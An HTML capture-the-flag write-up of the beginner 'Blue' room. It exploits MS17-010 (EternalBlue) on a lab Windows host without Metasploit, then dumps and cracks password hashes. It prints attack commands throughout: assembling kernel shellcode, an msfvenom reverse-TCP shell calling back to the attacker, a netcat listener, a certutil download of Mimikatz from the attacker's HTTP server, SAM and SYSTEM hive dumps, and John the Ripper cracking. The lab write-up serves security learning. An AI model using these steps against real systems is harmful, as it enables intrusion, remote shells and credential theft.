            <section id="introduction">
                <h2>Introduction</h2>
                <p>Nearly every write-up I could find on this room followed the steps exactly, i.e. ran the commands given in the room guidance, primarily running Metasploit modules. I also searched online, where I found some more interesting manual approaches. I have taken bits and pieces from these walkthroughs, plus added a little of my own ideas, such as using Mimikatz to extract the password hashes. Hopefully, this write-up will be useful to individuals wanting to approach the challenge a little differently and without the help of Metasploit (although I do use msfvenom for my payload).</p>

            <section id="One">
                <h2>Step One - Enumeration</h2>
                <p>Perform a basic network mapper scan. We do not need DNS resolution (-n), let's perform a TCP SYN scan (-sS, a little bit stealthier), and output to an xml file (-oX).</p>
                <pre><code>case@local:~$ nmap -n -v -sS -oX blue_output.xml 10.10.34.160</code></pre>
                <p>Here is a truncated snapshot of our scan output.</p>
                <img src="blue_output.png" alt="not_found.png">
                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceeding learning modules have been almost exclusively referring to the EternalBlue exploit. Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
                <pre><code>case@local:~$ nmap -n -v --script=vuln -p 445 -oX blue_script_vulns.xml 10.10.34.160</code></pre>
                <p>Here is a truncated snapshot of our scan output.</p>
                <img src="blue_script_vulns.png" alt="not_found.png">
                <p>Our suspicions have been confirmed, this machine is indeed vulnerable to "Remote Code Execution vulnerability in Mircosoft SMBv1 servers (ms17-010)". We have the CVE ID also. A quick search in exploit-db shows a number of available exploits.</p>
                <img src="ms17_exploits.png" alt="not_found.png">
                <p>Anyway, as mentioned in the intro, most write-ups for this room follow the exact same patterns, so I thought I would have a "look-about" on the Web, in order to see what I could find. I came across this GitHub repo: <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">3ndG4me/AutoBlue</a>. The README states "This version of the exploit {EternalBlue} is prepared in a way where you can exploit eternal blue WITHOUT Metasploit". This is exactly what I want to do. </p>
            </section>
            
            <section id="Two">
                <h2>Step Two - Gain Access</h2>
                <p>I now know the machine is vulnerable to CVE-2017-0143. I have also found an interesting GitHub repo that includes some relevant, EternalBlue, exploit code. The repo actually contains the following file "eternalblue_kshellcode_x64.asm". This is an x64 assembly file, containing 64-bit kernel shellcode (kernel shellcode is a type of shellcode that runs with kernel-level (ring 0) privileges, i.e. full access to system hardware, memory etc). The repo even comes with shell scripts for assembling the entire payload, reverse shell included. However, this is a learning process, so let us do some of this manually.</p>
                <p>A quick look at the script "shell_prep.sh" and we can quickly see how this is achieved. The shell runs the following command.</p>
                <pre><code>nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin</code></pre>
                <p>This command invokes the Netwide Assembler (NASM) to assemble the shellcode to a raw binary (bin) file, i.e. a direct translation into machine code, no headers or metadata. Run this command directly to create your payload file "sc_x64_kernel.bin".</p>
                <p>I can also see that the "shell_prep.sh" script would have given us options to generate a reverse shell, either a Meterpreter shell or a regular cmd shell, for which it would also generate a raw binary file. Finally, it would have combined this reverse shell binary with the kernel shell code binary. So far, as we are doing this manually, we have only created the shellcode binary, "sc_x64_kernel.bin". We need to create a raw binary of a reverse shell for this exploit to work. Of course I cannot read the binary and I have not read the assembly, but I imagine the kernel shell code takes control of the target system's kernel, perhaps to gain elevated privileges and preparing the system for executing further commands, and will then execute the reverse shell, which we can catch on our local machine. </p>
                <p>Let us create our reverse shell code binary using <i>msfvenom</i>. Here we create a stageless Windows, 64-bit, reverse-tcp shell, in raw binary format.</p>
                <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
                <p>Finally, we need to combine the kernel shellcode exploit binary with the reverse shell binary, again this would have been done by the "shell_prep.sh", but manually is easy too.</p>
                <pre><code>case@local:~$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin</code></pre>
                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years of Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                <p>We can then run the exploit.</p>
                <pre><code>case@local:~$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin</code></pre>
                <p>We are in!</p>
                <pre><code>case@local:~$ sudo nc -lvnp 444

            <section id="Three">
                <h2>Step Three - Escalation and Password Dumping</h2>
                <p>Firstly, let us see which user context our reverse shell is running under.</p>
                <pre><code>C:\Windows\system32>cmd.exe /c whoami
cmd.exe /c whoami
nt authority\system</code></pre>
                <p>We have gained <i>NT AUTHORITY\SYSTEM</i> privileges. This is the highest level of privilege on Windows, similar to "root" on Linux. Therefore, we now have full administrative control on the target machine and should be able to perform any action on the system, including altering files, changing settings and installing programs. Given this information we can now upload Mimikatz, which will allow us to extract additional sensitive information, such as password hashes and kerberos tickets (Mimikatz is a post-exploitation tool designed to allow attackers to extract sensitive data, like passwords). Let us upload Mimikatz to our target, with a view to dumping the NTLM hashes (part of this CTF is cracking a specific password, so we will need this information). </p>
                <p>You can download Mimikatz binaries from the GitHub <a href="https://github.com/gentilkiwi/mimikatz/releases"> releases repo.</a> Next, start a Python HTTP server. I have a Python virtual environment setup, so the command looks like this.</p>
                <pre><code>(kcah_py_env) case@local:~$ python3 -m http.server 8001</code></pre>
                <p>Then request "mimikatz.exe" from the target server (make sure the mimikatz executable is located in the same directory as you are running the Python server from).</p>
                <pre><code>C:\Windows\system32>certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\System32\mimikatz.exe
****  Online  ****
  000000  ...
  108c00
CertUtil: -URLCache command completed successfully.</code></pre>
                <p>We have successfully uploaded the Mimikatz executable to our target server. We now want to extract the password hashes. We need to accesss the Security Account Manager (SAM) hive, which is the file that contains the hashed passwords of all the local user accounts. However, we have a problem, as the file will likely already be in use by another system process, and will be locked by Windows. Attempting to read the the file directly with Mimikatz will likely fail. The first step, therefore, will be to export the relevant hives/files from the Windows Registry into separate files that we can readily access with Mimikatz. </p>
            <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
            <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
            <p>Here is our output. It appears we have a problem!</p>
            <pre><code>C:\Windows\system32>reg save hklm\sam c:\sam
reg save hklm\sam c:\sam
ERROR: A required privilege is not held by the client.</code></pre>
            <p>Fortunately for us we have uploaded the excellent post exploitation tool Mimikatz. Mimikatz has the following command <i>privilege::debug</i>. When you run this command Mimikatz attempts to grant the process <i>SeDebugPrivilege</i>, which is a Windows privilege that allows a user to debug processes owned by other users. Importantly, it includes the ability to read and write to the memory of other processes, including retrieving sensitive information such as passwords and hashes, from processes like "lsass.exe" (the Local Security Authority Subsystem), which manages user logins and authentication. </p>
            <p>Start Mimikatz.</p>
            <pre><code>C:\Windows\system32>mimikatz.exe</code></pre>
            <p>Run the following command, in order to grant process <i>SeDebugPrivilege</i>. You should see the OK message if this is successful. Note, I had an issue here, and I fell down a rabbit hole for several hours. The issue in the end was that I had originally uploaded the 32-bit version of Mimikatz, when the target system we are actualy trying to exploit is a 64-bit system.</p>
            <pre><code>mimikatz # privilege::debug
Privilege '20' OK</code></pre>
            <p>We can now try and export the SAM and SYSTEM hives again.</p>
            <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
            <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
            <p>This time we can see that we were successful.</p>
            <pre><code>C:\Windows\system32>reg save hklm\sam c:\sam
reg save hklm\sam c:\sam
The operation completed successfully.
            
C:\Windows\System32>reg save hklm\system c:\system
reg save hklm\system c:\system
The operation completed successfully</code></pre>
            <p>Here we export the SYSTEM hive too, which typically contains configuration settings and parameters that Windows uses during the boot process and for the management of hardware devices.</p>
            <p>Once we have extracted the hives we can use Mimikatz to dump the password hashes.</p>
            <pre><code>mimikatz # lsadump::sam /system:C:\system /sam:C:\sam
Domain : JON-PC
SysKey : 55.......
...
...
User : Administrator
    Hash NTLM: 31d6c.........

User : Guest

User : Jon
    Hash NTLM: ffb43............</code></pre>
            <p>Make sure you save these hashes somewhere, as we will need them for the next stage of the CTF.</p>                
            </section>

            <section id="Four">
                <h2>Step Four - Hash Cracking</h2>
                <p>The challenge requires us to crack the password of the "non-default" user. We can see from our previous, Mimikatz, output that the non-default user is "Jon". Let us crack the hash. We could use the Python script "hash-id.py" to establish the hash format, but given that this is a beginner CTF and that we have retrieved these hashes from a Windows Security Accounts Manager (SAM) hive, it is likely that these are NT hashes. Let us use John the Ripper with format specific cracking, in order to see if our assumptions are correct.</p>
                <p>Firstly save the hash for user Jon to a text file. Then pass the hash to JTR.</p>
                <pre><code>case@local:~/src/john/run$ ./john --format=NT --fork=8 --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt</code></pre>
                <p>We now have user "Jon's" password.</p>
                <pre><code>Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Node numbers 1-8 of 8 (fork)
Note: Passwords longer than 27 rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alq.......... (?)</code></pre>
                <p>I have not actually shown the password, do it yourself!</p>

                <h2>Conclusion</h2>
                <p>This was fairly straight forward and should not give you any trouble. It is the first CTF in the Complete Beginner path so although it was fairly easy it was very useful in applying the techniques taught in the path up to this point. The key is to enumerate thoroughly first, carefully consider what you know about your target and tailor your attack based on what you know.</p>
